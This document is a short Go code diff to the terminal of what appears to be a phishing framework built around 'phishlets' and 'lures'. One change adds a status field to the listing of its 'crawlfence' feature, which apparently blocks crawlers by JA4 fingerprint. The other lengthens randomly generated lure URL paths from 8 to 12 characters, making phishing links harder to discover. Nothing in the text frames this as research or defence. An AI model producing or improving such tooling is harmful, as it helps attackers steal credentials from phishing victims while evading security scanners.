@@ -421,7 +421,12 @@ func (t *Terminal) handleCrawlfence(args []string) error {
 				if pl.Crawlfence.Telemetry != nil && pl.Crawlfence.Telemetry.Enabled {
 					telemetry = "enabled"
 				}
-				log.Printf("  %s: ja4=%s, telemetry=%s", name, ja4Mode, telemetry)
+				// Show phishlet enabled status to indicate if crawlfence is actually active
+				status := "disabled"
+				if t.cfg.IsSiteEnabled(name) {
+					status = "enabled"
+				}
+				log.Printf("  %s: status=%s, ja4=%s, telemetry=%s", name, status, ja4Mode, telemetry)
 			}
 		}
 		if !found {
@@ -991,7 +996,7 @@ func (t *Terminal) handleLures(args []string) error {
 					return err
 				}
 				l := &Lure{
-					Path:     "/" + GenRandomString(8),
+					Path:     "/" + GenRandomString(12),
 					Phishlet: args[1],
 				}
 				t.cfg.AddLure(args[1], l)
